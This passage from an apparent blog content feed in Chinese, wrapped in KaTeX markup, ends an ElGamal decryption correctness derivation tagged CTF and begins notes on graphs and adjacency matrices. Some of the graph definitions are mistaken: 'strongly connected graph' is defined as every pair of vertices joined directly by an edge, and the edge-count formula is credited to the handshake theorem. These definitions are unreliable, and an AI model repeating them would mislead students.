style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1.071331em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.821331em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span></span></p><p>然后，我们可以将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>的定义（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>g</mi><mi>x</mi></msup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">y = g^x \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span>）代入上式，得到：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>⋅</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>x</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><msup><mo stretchy="false">)</mo><mi>k</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>k</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mi>x</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m = (m \cdot (g^x \mod p)^k \mod p) \cdot (g^k \mod p)^{-x} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1.071331em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.821331em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span></span></p><p>因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><msup><mo stretchy="false">)</mo><mi>b</mi></msup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>a</mi><mi>b</mi></msup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(a \mod n)^b \mod n = (a^b \mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，我们可以简化上式为：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>⋅</mo><msup><mi>g</mi><mrow><mi>x</mi><mi>k</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mrow><mi>k</mi><mi>x</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m = (m \cdot g^{xk} \mod p) \cdot (g^{kx} \mod p)^{-1} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span></span></p><p>此处的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mrow><mi>k</mi><mi>x</mi></mrow></msup></mrow><annotation encoding="application/x-tex">g^{kx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mrow><mi>x</mi><mi>k</mi></mrow></msup></mrow><annotation encoding="application/x-tex">g^{xk}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span></span>是相等的，所以我们可以进一步简化上式为：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>m</mi><mo>⋅</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mrow><mi>x</mi><mi>k</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>⋅</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mrow><mi>x</mi><mi>k</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m = m \cdot (g^{xk} \mod p) \cdot (g^{xk} \mod p)^{-1} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span></span></p><p>最后，根据模运算的性质，我们可以得到：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>m</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m = m \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span></span></p><p>所以，解密过程是正确的，解密后的消息<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>就是原始的明文消息。</p>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>邻接矩阵</title>
      <link href="/2024472eb9282fc5/"/>
      <url>/2024472eb9282fc5/</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><ol><li><p>二维数组</p><h1 id="图概述">图概述</h1><p>图(map)是一种非线性的数据结构.</p><p>图上的每一个节点i,可以有若干个节点指向i,节点i自身也可以指向若干个节点.—&gt;非线性的</p><p>线性&lt;-&gt;一对一</p><p>非线性&lt;-&gt; 非一对一(一对一,一对多)</p></li></ol><p>连通图: 图上任意两点之间,都有<code>路径</code>,那么这个图就是连通图.</p><p>强连通图: 图上任意两点之间,都有一条<code>边</code>直接相连.</p><p>最大联通子图: 一个图的连通子图,如果加入任意一个其他的顶点,都会导致该子图不再连通,那么这个子图就是原来这个图的<code>一个</code>最大连通子图.</p><br><p>无向图: 图中的<code>边</code>没有方向—其实是双向的.</p><p>有向图: 图中的&quot;边&quot;(<code>弧</code>)有方向—只能从<code>弧的起点</code>到<code>弧的终点</code>—单向的.</p><br><p>边: 没有方向的,双向的.</p><p>弧: 有方向约束,不能反方向.</p><br><p>有权(重)图: 边的代价.</p><br><p>公式:</p><p>n个顶点的连通无向图,最多有多少条边(握手定理)=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">n*(n-1)/2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">2</span></span></span></span>,最少有多少条边=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>.</p><p>…</p><h1 id="邻接矩阵概述">邻接矩阵概述</h1><p>什么是邻接:</p><p>邻接: 